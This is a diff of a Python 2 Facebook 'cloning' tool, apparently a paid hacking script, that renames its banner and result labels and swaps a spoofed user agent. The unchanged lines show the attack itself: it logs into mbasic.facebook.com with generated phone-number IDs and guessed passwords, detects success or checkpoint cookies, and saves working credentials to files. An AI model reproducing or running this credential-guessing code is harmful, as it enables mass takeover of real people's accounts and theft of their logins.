@@ -28,7 +28,7 @@ try:
 except:
     os.system('pip2 install lolcat')
 
-logo = "'\x1b[1;92m' \n    ########     ###          ##    ###    \n    ##     ##   ## ##         ##   ## ##   \n    ##     ##  ##   ##        ##  ##   ##  \n    ########  ##     ##       ## ##     ## \n    ##   ##   ######### ##    ## ######### \n    ##    ##  ##     ## ##    ## ##     ## \n    ##     ## ##     ##  ######  ##     ##\n\n\n'\x1b[1;91m'   Author      :     Z4IN B4LOCH   \n'\x1b[1;92m'   Github      :     TALIBAN-188 \n'\x1b[1;92m'   Z4IN     :  BALOCH   \n'\x1b[1;91m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;92m'   WAP NUMBER  :     03352450877           \n"
+logo = "'\x1b[1;92m' \n    ########     ###          ##    ###    \n    ##     ##   ## ##         ##   ## ##   \n    ##     ##  ##   ##        ##  ##   ##  \n    ########  ##     ##       ## ##     ## \n    ##   ##   ######### ##    ## ######### \n    ##    ##  ##     ## ##    ## ##     ## \n    ##     ## ##     ##  ######  ##     ##\n\n\n'\x1b[1;91m'   Author      :     Z4IN B4LOCH   \n'\x1b[1;92m'   Github      :     TALIBAN-188 \n'\x1b[1;92m'   Z4IN     :    BALOCH   \n'\x1b[1;91m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;92m'   WAP NUMBER  :     03352450877           \n"
 dec = '2'
 server = '2'
 rsauser = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
@@ -247,7 +247,7 @@ def numcloning():
          'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
          'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
          'Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
-         'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'])
+         'Mozilla/5.0 (Linux; Android 11; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36]'])
         try:
             pass1 = user
             rana = requests.Session()
@@ -255,13 +255,13 @@ def numcloning():
             p = rana.get('https://mbasic.facebook.com')
             b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid + user, 'pass': pass1, 'login': 'submit'})
             if 'c_user' in rana.cookies.get_dict().keys():
-                print '\x1b[1;92m[RAJA-OK] ' + coc + user + ' | ' + pass1
+                print '\x1b[1;92m[ZAIN-OK] ' + coc + user + ' | ' + pass1
                 ok = open('random-ok.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                print '\x1b[1;91m[RAJA-CP] ' + coc + user + ' | ' + pass1
+                print '\x1b[1;91m[ZAIN-CP] ' + coc + user + ' | ' + pass1
                 cp = open('imtiaz random-cp.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
